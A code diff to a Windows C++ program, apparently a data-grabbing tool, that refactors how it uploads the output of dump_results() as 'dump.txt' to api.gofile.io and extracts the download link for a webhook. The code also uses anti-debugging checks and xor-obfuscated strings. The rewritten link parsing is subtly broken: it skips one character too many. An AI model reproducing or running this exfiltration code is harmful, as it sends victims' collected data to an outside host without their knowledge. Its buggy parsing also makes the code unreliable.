@@ -10,6 +10,10 @@
 #include <array>
 #include <thread>
 
+#ifdef WEBHOOK
+#define BOUNDARY "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+#endif
+
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 #if ANTIDBG
   if (is_debugged())
@@ -85,24 +89,32 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 #endif
 
 #ifdef WEBHOOK
-#define BOUNDARY "----WebKitFormBoundary7MA4YWxkTrZu0gW"
-#include <nlohmann/json.hpp>
-
-try {
-
+  try {
+    
     std::stringstream file_stream;
     file_stream << dump_results();
     std::string dump_data = file_stream.str();
-  
+
+    
     auto gofile_res = HTTP::post("https://api.gofile.io/uploadFile", dump_data, {
         {xor("Content-Type"), "application/octet-stream"},
         {xor("Content-Disposition"), "form-data; name=\"file\"; filename=\"dump.txt\""}
     });
 
     if (gofile_res.status_code == 200) {
-
-        auto gofile_json = gofile_res.json();
-        std::string download_link = gofile_json["data"]["downloadPage"].as<std::string>();
+        
+        std::string response = gofile_res.body;  
+        std::string download_link;
+        
+        
+        size_t start_pos = response.find("\"downloadPage\":\"");
+        if (start_pos != std::string::npos) {
+            start_pos += 17; 
+            size_t end_pos = response.find("\"", start_pos);
+            if (end_pos != std::string::npos) {
+                download_link = response.substr(start_pos, end_pos - start_pos);
+            }
+        }
 
 
         std::stringstream ss;
@@ -117,11 +129,10 @@ try {
     } else {
         PRINTF("Failed to upload to GoFile\n");
     }
-} catch (const HTTPException &e) {
+  } catch (const HTTPException &e) {
     PRINTF("Failed to send results: %s\n", e.what());
-}
+  }
 #endif
-
 
   return 0;
 }
